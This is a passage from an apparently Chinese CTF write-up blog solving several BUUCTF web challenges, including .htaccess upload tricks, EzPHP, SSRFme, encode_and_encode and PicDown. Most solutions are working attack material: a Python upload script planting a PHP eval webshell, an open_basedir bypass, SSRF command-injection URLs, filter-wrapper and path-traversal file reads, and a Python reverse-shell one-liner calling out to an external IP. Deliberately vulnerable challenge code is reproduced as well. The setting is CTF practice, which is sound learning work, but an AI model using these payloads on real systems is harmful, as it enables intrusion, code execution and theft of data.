.abc</span><br><span class="line">php_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;tmp_fd40c7f4125a9b9ff1a4e75d293e3080&#x2F;shell.abc&quot;</span><br></pre></td></tr></table></figure><p>shell.abc：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a12PD9waHAgZXZhbCgkX0dFVFsnYyddKTs&#x2F;Pg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>这里GIF89a后面那个12是为了补足8个字节，满足base64编码的规则,使用其他的文件头也是可以的贴一个上传的脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">htaccess &#x3D; b&quot;&quot;&quot;</span><br><span class="line">#define width 1337</span><br><span class="line">#define height 1337 </span><br><span class="line">AddType application&#x2F;x-httpd-php .abc</span><br><span class="line">php_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;tmp_fd40c7f4125a9b9ff1a4e75d293e3080&#x2F;shell.abc&quot;</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">shell &#x3D; b&quot;GIF89a12&quot; + base64.b64encode(b&quot;&lt;?php eval($_REQUEST[&#39;a&#39;]);?&gt;&quot;)</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;16855023-61d5-430f-bbef-53d0bca8f179.node1.buuoj.cn?_&#x3D;$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%fe&#125;();&amp;%fe&#x3D;get_the_flag&quot;</span><br><span class="line"></span><br><span class="line">files &#x3D; &#123;&#39;file&#39;:(&#39;.htaccess&#39;,htaccess,&#39;image&#x2F;jpeg&#39;)&#125;</span><br><span class="line">data &#x3D; &#123;&quot;upload&quot;:&quot;Submit&quot;&#125;</span><br><span class="line">response &#x3D; requests.post(url&#x3D;url, data&#x3D;data, files&#x3D;files)</span><br><span class="line">print(response.text)</span><br><span class="line"></span><br><span class="line">files &#x3D; &#123;&#39;file&#39;:(&#39;shell.abc&#39;,shell,&#39;image&#x2F;jpeg&#39;)&#125;</span><br><span class="line">response &#x3D; requests.post(url&#x3D;url, data&#x3D;data, files&#x3D;files)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure><p>知识点三   </p><p>绕过open_basedir/disable_function</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">open_basedir是php.ini中的一个配置选项</span><br><span class="line">它可将用户访问文件的活动范围限制在指定的区域，</span><br><span class="line">假设open_basedir&#x3D;&#x2F;home&#x2F;wwwroot&#x2F;home&#x2F;web1&#x2F;:&#x2F;tmp&#x2F;，</span><br><span class="line">那么通过web1访问服务器的用户就无法获取服务器上除了&#x2F;home&#x2F;wwwroot&#x2F;home&#x2F;web1&#x2F;和&#x2F;tmp&#x2F;这两个目录以外的文件。</span><br><span class="line">注意用open_basedir指定的限制实际上是前缀,而不是目录名。</span><br><span class="line">举例来说: 若&quot;open_basedir &#x3D; &#x2F;dir&#x2F;user&quot;, 那么目录 &quot;&#x2F;dir&#x2F;user&quot; 和 &quot;&#x2F;dir&#x2F;user1&quot;都是可以访问的。</span><br></pre></td></tr></table></figure><p>所以如果要将访问限制在仅为指定的目录，请用斜线结束路径名。<br>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);echo(file_get_contents(&#39;flag&#39;));</span><br></pre></td></tr></table></figure><p>解题</p><h1 id="BJDCTF2020-EzPHP"><a href="#BJDCTF2020-EzPHP" class="headerlink" title="[BJDCTF2020]EzPHP"></a>[BJDCTF2020]EzPHP</h1><p>1nD3x.php </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line">$file = <span class="string">"1nD3x.php"</span>;</span><br><span class="line">$shana = $_GET[<span class="string">'shana'</span>];</span><br><span class="line">$passwd = $_GET[<span class="string">'passwd'</span>];</span><br><span class="line">$arg = <span class="string">''</span>;</span><br><span class="line">$code = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SERVER) &#123; </span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        preg_match(<span class="string">'/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i'</span>, $_SERVER[<span class="string">'QUERY_STRING'</span>])</span><br><span class="line">        )  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'You seem to want to do something bad?'</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'/http|https/i'</span>, $_GET[<span class="string">'file'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/^aqua_is_cute$/'</span>, $_GET[<span class="string">'debu'</span>]) &amp;&amp; $_GET[<span class="string">'debu'</span>] !== <span class="string">'aqua_is_cute'</span>) &#123; </span><br><span class="line">        $file = $_GET[<span class="string">"file"</span>]; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Neeeeee! Good Job!&lt;br&gt;"</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">'fxck you! What do you want to do ?!'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_REQUEST) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>($_REQUEST <span class="keyword">as</span> $value) &#123; </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/[a-zA-Z]/i'</span>, $value))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'fxck you! I hate English!'</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_get_contents($file) !== <span class="string">'debu_debu_aqua'</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br&gt;"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;</span><br><span class="line">    extract($_GET[<span class="string">"flag"</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Very good! you know my password. But what is flag?&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck you! you don't know my password! And you don't know sha1! why you come here!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9]*$/isD'</span>, $code) || </span><br><span class="line">preg_match(<span class="string">'/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i'</span>, $arg) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">    $code(<span class="string">''</span>, $arg); </span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="HITCON-2017-SSRFme"><a href="#HITCON-2017-SSRFme" class="headerlink" title="[HITCON 2017]SSRFme"></a>[HITCON 2017]SSRFme</h1><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>])) &#123;</span><br><span class="line">        $http_x_headers = explode(<span class="string">','</span>, $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]);</span><br><span class="line">        $_SERVER[<span class="string">'REMOTE_ADDR'</span>] = $http_x_headers[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> $_SERVER[<span class="string">"REMOTE_ADDR"</span>];</span><br><span class="line"></span><br><span class="line">    $sandbox = <span class="string">"sandbox/"</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">"REMOTE_ADDR"</span>]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line"></span><br><span class="line">    $data = shell_exec(<span class="string">"GET "</span> . escapeshellarg($_GET[<span class="string">"url"</span>]));</span><br><span class="line">    $info = pathinfo($_GET[<span class="string">"filename"</span>]);</span><br><span class="line">    $dir  = str_replace(<span class="string">"."</span>, <span class="string">""</span>, basename($info[<span class="string">"dirname"</span>]));</span><br><span class="line">    @mkdir($dir);</span><br><span class="line">    @chdir($dir);</span><br><span class="line">    @file_put_contents(basename($info[<span class="string">"basename"</span>]), $data);</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>方法一: file 协议利用 open 命令执行<br>要执行的命令先前必须要有以命令为文件名的文件存在<br>所以需要执行两次payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=file:ls /|&amp;filename=ls /| <span class="comment">#两次</span></span><br></pre></td></tr></table></figure><p>管道符好像必须要加，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;efc32bf2-e10f-4e22-bdf0-9a17856f32f0.node3.buuoj.cn&#x2F;sandbox&#x2F;fcf2bccafc269c160382150a0166d632&#x2F;ls &#x2F;|</span><br></pre></td></tr></table></figure><p>然后readflag，如果直接/readflag的话，那么会在服务器的根目录创建这个文件，而不是在网站的那个目录，所以是无法命令执行的，所以可以用bash -c 相当于./readflag，而根据php字符解析特性，如果直接将./readflag传入，那么.就会变成下划线,从而不能命令执行。直接bash的话好像是只能bash 有sh后缀的文件，所以不能用。  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=file:bash -c /readflag|&amp;filename=bash -c /readflag|</span><br></pre></td></tr></table></figure><p>方法二：   </p><p>在vps写入一个马<br>ma.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一句话</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=ma.php&amp;url=vps.ip/ma.txt</span><br></pre></td></tr></table></figure><h1 id="b01lers2020-Welcome-to-Earth"><a href="#b01lers2020-Welcome-to-Earth" class="headerlink" title="[b01lers2020]Welcome to Earth"></a>[b01lers2020]Welcome to Earth</h1><h1 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>])) &#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">  $banword = [</span><br><span class="line">    <span class="comment">// no path traversal</span></span><br><span class="line">    <span class="string">'\.\.'</span>,</span><br><span class="line">    <span class="comment">// no stream wrapper</span></span><br><span class="line">    <span class="string">'(php|file|glob|data|tp|zip|zlib|phar):'</span>,</span><br><span class="line">    <span class="comment">// no data exfiltration</span></span><br><span class="line">    <span class="string">'flag'</span></span><br><span class="line">  ];</span><br><span class="line">  $regexp = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $banword) . <span class="string">'/i'</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match($regexp, $str)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$body = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$json = json_decode($body, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_valid($body) &amp;&amp; <span class="keyword">isset</span>($json) &amp;&amp; <span class="keyword">isset</span>($json[<span class="string">'page'</span>])) &#123;</span><br><span class="line">  $page = $json[<span class="string">'page'</span>];</span><br><span class="line">  $content = file_get_contents($page);</span><br><span class="line">  <span class="keyword">if</span> (!$content || !is_valid($content)) &#123;</span><br><span class="line">    $content = <span class="string">"&lt;p&gt;not found&lt;/p&gt;\n"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  $content = <span class="string">'&lt;p&gt;invalid request&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// no data exfiltration!!!</span></span><br><span class="line">$content = preg_replace(<span class="string">'/HarekazeCTF\&#123;.+\&#125;/i'</span>, <span class="string">'HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;'</span>, $content);</span><br><span class="line"><span class="keyword">echo</span> json_encode([<span class="string">'content'</span> =&gt; $content]);</span><br></pre></td></tr></table></figure><p>payload</p><p>可以用unicode编码绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;page&quot;:&quot;p\u0068\u0070:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;\u0066\u006c\u0061\u0067&quot;&#125;</span><br></pre></td></tr></table></figure><h1 id="网鼎杯-2020-白虎组-PicDown"><a href="#网鼎杯-2020-白虎组-PicDown" class="headerlink" title="[网鼎杯 2020 白虎组]PicDown"></a>[网鼎杯 2020 白虎组]PicDown</h1><p>存在任意文件读取<br>非预期可直接读flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</span><br></pre></td></tr></table></figure><p>预期</p><p>读取/proc/self/environ 读取进程运行的环境变量<br><img src="../../images/ctf/buuctf2/1.png" alt=""><br>/proc/self/cmdline 读取当前进程运行的命令<br><img src="../../images/ctf/buuctf2/2.png" alt=""></p><p>读取<code>../../../../../app/app.py</code>源码  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">SECRET_FILE = <span class="string">"/tmp/secret.txt"</span></span><br><span class="line">f = open(SECRET_FILE)</span><br><span class="line">SECRET_KEY = f.read().strip()</span><br><span class="line">os.remove(SECRET_FILE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'search.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/page')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page</span><span class="params">()</span>:</span></span><br><span class="line">    url = request.args.get(<span class="string">"url"</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> url.lower().startswith(<span class="string">"file"</span>):</span><br><span class="line">            res = urllib.urlopen(url)</span><br><span class="line">            value = res.read()</span><br><span class="line">            response = Response(value, mimetype=<span class="string">'application/octet-stream'</span>)</span><br><span class="line">            response.headers[<span class="string">'Content-Disposition'</span>] = <span class="string">'attachment; filename=beautiful.jpg'</span></span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            value = <span class="string">"HACK ERROR!"</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        value = <span class="string">"SOMETHING WRONG!"</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'search.html'</span>, res=value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/no_one_know_the_manager')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">manager</span><span class="params">()</span>:</span></span><br><span class="line">    key = request.args.get(<span class="string">"key"</span>)</span><br><span class="line">    print(SECRET_KEY)</span><br><span class="line">    <span class="keyword">if</span> key == SECRET_KEY:</span><br><span class="line">        shell = request.args.get(<span class="string">"shell"</span>)</span><br><span class="line">        os.system(shell)</span><br><span class="line">        res = <span class="string">"ok"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res = <span class="string">"Wrong Key!"</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure><p>可以看到no_one_know_the_manager中要匹配SECRET_KEY，然后执行shell，但是SECRET_KEY所在的secret.txt被删掉了<br>此处可以通过/proc/pid/fd/读取，这个目录包含了进程打开的每一个文件的链接<br><img src="../../images/ctf/buuctf2/3.png" alt=""></p><p>执行命令后无回显,本地使用python反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">"import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('174.1.99.145',7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"</span></span><br></pre></td></tr></table></figure><p><img src="../../images/ctf/buuctf2/4.png" alt=""></p><h1 id="watevrCTF-2019-Cookie-Store"><a href="#watevrCTF-2019-Cookie-Store" class="headerlink" title="[watevrCTF-2019]Cookie Store"></a>[watevrCTF-2019]Cookie Store</h1><p>点击买flag,修改cooke的session的base64解码后的参数为200，在返回的history中解码后，即可得flag。<br><img src="../../images/ctf/buuctf2/5.png" alt=""></p><h1 id="WUSTCTF2020-CV-Maker"><a href="#WUSTCTF2020-CV-Maker" class="headerlink" title="[WUSTCTF2020]CV Maker"></a>[WUSTCTF2020]CV Maker</h1><p>注册一个用户登录后，直接上传php类型的文件。</p><h1 id="BJDCTF2020-EzPHP-1"><a href="#BJDCTF2020-EzPHP-1" class="headerlink" title="[BJDCTF2020]EzPHP"></a>[BJDCTF2020]EzPHP</h1><p>知识点  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">base32</span><br><span class="line">url编码绕过</span><br><span class="line">preg_match在非&#x2F;s模式下的绕过</span><br><span class="line">$_POST和$_GET的优先级</span><br><span class="line">PHP伪协议。</span><br><span class="line">sha1函数的数组绕过。</span><br><span class="line">create_function()的代码注入</span><br></pre></td></tr></table></figure><p>页面源码  找到一个base32的字符串，解码得1nD3x.php </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line">$file = <span class="string">"1nD3x.php"</span>;</span><br><span class="line">$shana = $_GET[<span class="string">'shana'</span>];</span><br><span class="line">$passwd = $_GET[<span class="string">'passwd'</span>];</span><br><span class="line">$arg = <span class="string">''</span>;</span><br><span class="line">$code = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SERVER) &#123; </span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        preg_match(<span class="string">'/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i'</span>, $_SERVER[<span class="string">'QUERY_STRING'</span>])</span><br><span class="line">        )  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'You seem to want to do something bad?'</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'/http|https/i'</span>, $_GET[<span class="string">'file'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/^aqua_is_cute$/'</span>, $_GET[<span class="string">'debu'</span>]) &amp;&amp; $_GET[<span class="string">'debu'</span>] !== <span class="string">'aqua_is_cute'</span>) &#123; </span><br><span class="line">        $file = $_GET[<span class="string">"file"</span>]; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Neeeeee! Good Job!&lt;br&gt;"</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">'fxck you! What do you want to do ?!'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_REQUEST) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>($_REQUEST <span class="keyword">as</span> $value) &#123; </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/[a-zA-Z]/i'</span>, $value))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'fxck you! I hate English!'</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_get_contents($file) !== <span class="string">'debu_debu_aqua'</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br&gt;"</span>);</span><br><span class="line"></span><br><span 